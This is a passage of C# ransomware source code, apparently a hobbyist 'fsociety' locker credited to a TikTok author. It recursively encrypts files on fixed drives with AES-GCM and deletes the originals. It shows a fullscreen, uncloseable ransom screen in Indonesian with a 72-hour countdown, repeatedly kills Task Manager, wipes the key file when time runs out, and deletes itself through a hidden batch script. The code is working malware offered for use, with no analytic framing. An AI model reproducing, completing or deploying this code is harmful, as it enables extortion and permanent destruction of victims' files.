                    .Where(f => f9a3c2d7b.e4b8a1f6c.TargetExtensions.Contains(
                        Path.GetExtension(f).ToLower()))
                    .ToList();

                if (files.Count > 0)
                {
                    Parallel.ForEach(files, new ParallelOptions
                    {
                        MaxDegreeOfParallelism = Math.Min(Environment.ProcessorCount, 8)
                    }, file =>
                    {
                        try
                        {
                            EncryptFileGcm(file, masterKey);
                            encryptedFiles.Add(file + ".fsociety");
                        }
                        catch { }
                    });
                }

                foreach (string subDir in Directory.EnumerateDirectories(path))
                    EncryptDirectory(subDir, masterKey);
            }
            catch { }
        }

        private static void EncryptFileGcm(string filePath, byte[] masterKey)
        {
            if (!File.Exists(filePath)) return;
            byte[] plain = File.ReadAllBytes(filePath);
            if (plain.Length == 0) return;

            byte[] fileSalt = RandomNumberGenerator.GetBytes(16);
            byte[] derivedKey;
            using (var deriveBytes = new Rfc2898DeriveBytes(masterKey, fileSalt, 10000, HashAlgorithmName.SHA256))
            {
                derivedKey = deriveBytes.GetBytes(32);
            }

            byte[] nonce = RandomNumberGenerator.GetBytes(12);
            byte[] tag = new byte[16];
            byte[] ciphertext = new byte[plain.Length];

            using (var aes = new AesGcm(derivedKey))
            {
                aes.Encrypt(nonce, plain, ciphertext, tag);
            }

            string outputPath = filePath + ".fsociety";
            using (FileStream fs = new FileStream(outputPath, FileMode.Create))
            {
                fs.Write(f9a3c2d7b.e4b8a1f6c.Magic, 0, 4);
                fs.WriteByte(0x03);
                fs.Write(fileSalt, 0, 16);
                fs.Write(nonce, 0, 12);
                fs.Write(tag, 0, 16);
                fs.Write(ciphertext, 0, ciphertext.Length);
            }

            try { File.Delete(filePath); } catch { }
            finally { Array.Clear(derivedKey, 0, derivedKey.Length); }
        }

        public static void DecryptAllDrives(byte[] masterKey)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (!drive.IsReady || drive.DriveType != DriveType.Fixed) continue;
                DecryptDirectory(drive.RootDirectory.FullName, masterKey);
            }
        }

        private static void DecryptDirectory(string path, byte[] masterKey)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(path, "*.fsociety"))
                {
                    try { DecryptFileGcm(file, masterKey); }
                    catch { }
                }
                foreach (string dir in Directory.EnumerateDirectories(path))
                    DecryptDirectory(dir, masterKey);
            }
            catch { }
        }

        private static void DecryptFileGcm(string filePath, byte[] masterKey)
        {
            if (!File.Exists(filePath)) return;
            string originalPath = filePath.Substring(0, filePath.Length - ".fsociety".Length);

            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] magicRead = new byte[4];
                fs.Read(magicRead, 0, 4);
                if (!magicRead.SequenceEqual(f9a3c2d7b.e4b8a1f6c.Magic)) return;

                int version = fs.ReadByte();
                byte[] fileSalt = new byte[16];
                fs.Read(fileSalt, 0, 16);
                byte[] nonce = new byte[12];
                fs.Read(nonce, 0, 12);
                byte[] tag = new byte[16];
                fs.Read(tag, 0, 16);
                byte[] ciphertext = new byte[fs.Length - fs.Position];
                fs.Read(ciphertext, 0, ciphertext.Length);

                byte[] derivedKey;
                using (var deriveBytes = new Rfc2898DeriveBytes(masterKey, fileSalt, 10000, HashAlgorithmName.SHA256))
                {
                    derivedKey = deriveBytes.GetBytes(32);
                }

                byte[] plain = new byte[ciphertext.Length];
                using (var aes = new AesGcm(derivedKey))
                {
                    aes.Decrypt(nonce, ciphertext, tag, plain);
                }

                File.WriteAllBytes(originalPath, plain);
                Array.Clear(derivedKey, 0, derivedKey.Length);
            }

            try { File.Delete(filePath); } catch { }
        }
    }
    #endregion

    #region LockSurface
    public sealed class LockSurface : Form
    {
        private System.Windows.Forms.Timer countdown;
        private System.Windows.Forms.Timer taskKillTimer;
        private int remaining = 72 * 3600;
        private TextBox input;
        private Label timerLabel, statusLabel, infoLabel;
        private bool decrypting = false;

        public LockSurface()
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            BackColor = Color.Black;
            ForeColor = Color.Lime;
            Font = new Font("Consolas", 10, FontStyle.Regular);
            ShowInTaskbar = false;
            ControlBox = false;
            TopMost = true;
            KeyPreview = true;
            KeyDown += (s, e) => { e.Handled = true; };
            SetupUI();
            StartCountdown();
            StartTaskKillTimer();
        }

        private void SetupUI()
        {
            Label ascii = new Label
            {
                Text = @"
    .o88o.                               o8o                .
    888 `""                               `""'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  ""8 d88' `88b d88' `""Y8 `888  d88' `88b   888    `88.  .8'
    888    `""Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   ""888""      d8'
                                                                .o...P'

CREATED BY: kernelpanic13371 (tiktok)
channel whatsapp https://whatsapp.com/channel/0029VbDGJUiKLaHpFoYbaA31",
                Location = new Point(50, 30),
                AutoSize = true,
                ForeColor = Color.Lime,
                BackColor = Color.Black,
                Font = new Font("Consolas", 8, FontStyle.Bold)
            };
            Controls.Add(ascii);

            timerLabel = new Label
            {
                Location = new Point(50, 250),
                AutoSize = true,
                ForeColor = Color.Red,
                BackColor = Color.Black,
                Font = new Font("Consolas", 16, FontStyle.Bold),
                Text = "Waktu tersisa: 72:00:00"
            };
            Controls.Add(timerLabel);

            infoLabel = new Label
            {
                Location = new Point(50, 290),
                AutoSize = true,
                ForeColor = Color.White,
                BackColor = Color.Black,
                Font = new Font("Consolas", 10),
                MaximumSize = new Size(900, 0),
                Text = "YOUR FILES ARE ENCRYPTED WITH AES-256-GCM.\n" +
                       "THE DECRYPTION KEY IS ENCRYPTED AND STORED ON YOUR SYSTEM.\n" +
                       "IF THE TIMER EXPIRES, THE DECRYPTION KEY WILL BE\n" +
                       "PERMANENTLY DESTROYED AND YOUR FILES WILL BE LOST FOREVER.\n\n" +
                       "ENTER UNLOCK CODE TO DECRYPT:"
            };
            Controls.Add(infoLabel);

            input = new TextBox
            {
                Location = new Point(50, 390),
                Width = 350,
                BackColor = Color.Black,
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 10),
                PasswordChar = '*',
                MaxLength = 64
            };
            Controls.Add(input);

            Button unlockBtn = new Button
            {
                Text = "DECRYPT",
                Location = new Point(410, 388),
                Width = 120,
                Height = 28,
                BackColor = Color.Green,
                ForeColor = Color.Black,
                Font = new Font("Consolas", 10, FontStyle.Bold),
                FlatStyle = FlatStyle.Flat
            };
            unlockBtn.Click += UnlockAttempt;
            Controls.Add(unlockBtn);

            statusLabel = new Label
            {
                Location = new Point(50, 430),
                AutoSize = true,
                ForeColor = Color.Red,
                BackColor = Color.Black,
                Font = new Font("Consolas", 9)
            };
            Controls.Add(statusLabel);
        }

        private void StartCountdown()
        {
            countdown = new System.Windows.Forms.Timer { Interval = 1000 };
            countdown.Tick += Tick;
            countdown.Start();
        }

        private void StartTaskKillTimer()
        {
            taskKillTimer = new System.Windows.Forms.Timer { Interval = 3000 };
            taskKillTimer.Tick += (s, e) =>
            {
                try
                {
                    foreach (var proc in Process.GetProcessesByName("taskmgr"))
                    {
                        try { proc.Kill(); } catch { }
                    }
                }
                catch { }
            };
            taskKillTimer.Start();
        }

        private void Tick(object sender, EventArgs e)
        {
            if (decrypting) return;
            remaining--;
            if (remaining <= 0)
            {
                countdown.Stop();
                timerLabel.Text = "WAKTU HABIS!";
                statusLabel.Text = "MENGHAPUS KUNCI DEKRIPSI...";
                Application.DoEvents();
                Thread.Sleep(3000);
                DestroyKeyAndExit();
            }
            else
            {
                TimeSpan t = TimeSpan.FromSeconds(remaining);
                timerLabel.Text = $"Waktu tersisa: {t.Hours:D2}:{t.Minutes:D2}:{t.Seconds:D2}";
            }
        }

        private async void UnlockAttempt(object sender, EventArgs e)
        {
            if (input.Text != f9a3c2d7b.e4b8a1f6c.UnlockCode)
            {
                statusLabel.Text = "KODE SALAH! SILAKAN COBA LAGI.";
                input.Clear();
                return;
            }

            countdown.Stop();
            taskKillTimer.Stop();
            decrypting = true;
            statusLabel.ForeColor = Color.Lime;
            statusLabel.Text = "KODE BENAR. MENGAMBIL KUNCI DEKRIPSI...";
            timerLabel.Text = "DEKRIPSI BERJALAN...";
            Application.DoEvents();

            byte[] masterKey = e4b8a1f6c.RetrieveEncryptedMasterKey();

            if (masterKey == null)
            {
                statusLabel.Text = "ERROR: KUNCI DEKRIPSI TIDAK DITEMUKAN!";
                statusLabel.ForeColor = Color.Red;
                return;
            }

            await Task.Run(() =>
            {
                EncryptionEngine.DecryptAllDrives(masterKey);
                Array.Clear(masterKey, 0, masterKey.Length);
            });

            statusLabel.Text = "DEKRIPSI SELESAI. MEMBUKA KUNCI...";
            Application.DoEvents();
            Thread.Sleep(2000);
            CleanExit();
        }

        private void DestroyKeyAndExit()
        {
            try
            {
                if (File.Exists(e4b8a1f6c.MarkerFilePath))
                {
                    File.SetAttributes(e4b8a1f6c.MarkerFilePath, FileAttributes.Normal);
                    byte[] markerData = File.ReadAllBytes(e4b8a1f6c.MarkerFilePath);
                    for (int i = 0; i < markerData.Length; i++) markerData[i] = 0xFF;
                    File.WriteAllBytes(e4b8a1f6c.MarkerFilePath, markerData);
                    File.Delete(e4b8a1f6c.MarkerFilePath);
                }
            }
            catch { }

            Invoke((MethodInvoker)(() =>
            {
                statusLabel.Text = "KUNCI DEKRIPSI TELAH DIHANCURKAN. FILE TIDAK DAPAT DIPULIHKAN.";
                timerLabel.Text = "00:00:00";
            }));

            Thread.Sleep(5000);
            SelfDestruct();
        }

        private void CleanExit()
        {
            try
            {
                HookManager.Uninstall();
                RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                key?.DeleteValue("DisableTaskMgr", false);
                key?.Close();
            }
            catch { }
            Application.Exit();
        }

        private static void SelfDestruct()
        {
            try
            {
                string exePath = Assembly.GetExecutingAssembly().Location;
                string bat = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".bat");
                File.WriteAllText(bat, $@"
@echo off
:retry
ping 127.0.0.1 -n 3 >nul
taskkill /f /im ""{Path.GetFileName(exePath)}"" >nul 2>&1
del /f /q ""{exePath}"" >nul 2>&1
if exist ""{exePath}"" goto retry
del /f /q ""{bat}""
exit
");
                Process.Start(new ProcessStartInfo(bat)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            catch { }
            Application.Exit();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnFormClosing(e);
        }
    }
    #endregion
}
